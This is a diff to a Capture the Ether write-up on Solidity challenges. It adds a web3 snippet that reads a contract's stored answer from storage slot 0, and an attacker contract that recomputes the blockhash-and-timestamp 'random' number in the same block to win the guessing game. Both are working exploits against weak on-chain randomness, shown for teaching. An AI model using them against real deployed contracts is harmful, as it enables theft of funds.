@@ -72,7 +72,7 @@ contract GuessTheNumberChallenge {
 }
 ```
 
-As we can see in this Solidity contract, the answer is stored as it in a global variable named `answer`.
+As we can see in this Solidity contract, the answer is stored as it in a state variable named `answer`.
 
 > It's time to D-D-D-D-Duel !
 
@@ -220,4 +220,94 @@ web3.eth.getTransaction(transactionHash, (err, transaction) => {
   });
 });
 
+```
+
+But there is another workaround, an easier one.
+The Solidity doc says that [`Statically-sized variables (everything except mapping and dynamically-sized array types) are laid out contiguously in storage starting from position 0`](http://solidity.readthedocs.io/en/develop/miscellaneous.html).
+As the contract only stores the answer as a state variable, we can get it using `web3.eth.getStorageAt` with the index `0`.
+
+```javascript
+var contract = 'ADDRESS_OF_DEPLOYED_CONTRACT';
+// get storage at index 0
+web3.eth.getStorageAt(contract, 0, (err, res) => {
+  // We have to convert the hex number to decimal
+  console.log(web3.toDecimal(res));
+});
+```
+
+We did it ! :sunglasses:
+
+### Guess the new number
+
+> The number is now generated on-demand when a guess is made.
+
+```javascript
+
+pragma solidity ^0.4.21;
+
+contract GuessTheNewNumberChallenge {
+    function GuessTheNewNumberChallenge() public payable {
+        require(msg.value == 1 ether);
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function guess(uint8 n) public payable {
+        require(msg.value == 1 ether);
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+
+        if (n == answer) {
+            msg.sender.transfer(2 ether);
+        }
+    }
+}
+
+```
+
+In this case we can't rely on a state variable. Every time we call the `guess` function, a new answer number is generated. But this number depends on the same datas we have seen before !
+So we again have to find `block.blockhash(parentBlockNumber)` and `block.timestamp`.
+
+> But how can we get the block of a pending transaction ? :thinking:
+
+Well as transactions are stacked in a [txpool](https://github.com/ethereum/go-ethereum/wiki/Management-APIs#txpool), we don't know in which block they will be mined (we can bet that it will be added in the next pending block but we can't get the timestamp of it).
+
+> Hopefully, when a contract makes an internal call to another contract, the block used in the internal call is the block of the main transaction. Knowing that, it is possible for us to call the `GuessTheNewRandomNumberChallenge` with the newly generated number.
+
+```javascript
+pragma solidity ^0.4.21;
+// Declare an interface in order to use the GuessTheNewRandomNumberChallenge functions
+interface GuessTheNewRandomNumberChallengeInterface {
+    function guess(uint8) external payable;
+}
+/// @title The contract that we will use to call the GuessTheNewRandomNumberChallenge contract
+contract CallingContract {
+    // owner -> Store the owner of the contract so you will be able to get your ether back
+    address public owner = msg.sender;
+    /**
+      * @notice Create a fallback function that is payable so the
+      * GuessTheNewRandomNumberChallenge contract can send you back the Ether
+      */
+    function () public payable {}
+
+    /**
+      * @notice withdraw -> Bankrupt the contract, sending all Ether to owner
+      */
+    function withdraw() public {
+        require(msg.sender == owner);
+        owner.transfer(address(this).balance);
+    }
+
+    /**
+      * @notice makeGuess -> Calls guess function at a given address
+      * @param address The address of the deployed GuessTheNewRandomNumberChallenge contract
+      */
+    function makeGuess(address contractAddress) public payable {
+        require(msg.value == 1 ether);
+        GuessTheNewRandomNumberChallengeInterface challenge = GuessTheNewRandomNumberChallengeInterface(contractAddress);
+        uint8 generatedAnswer = uint8(keccak256(block.blockhash(block.number - 1), now));
+        challenge.guess.value(1 ether)(generatedAnswer);
+    }
+}
 ```
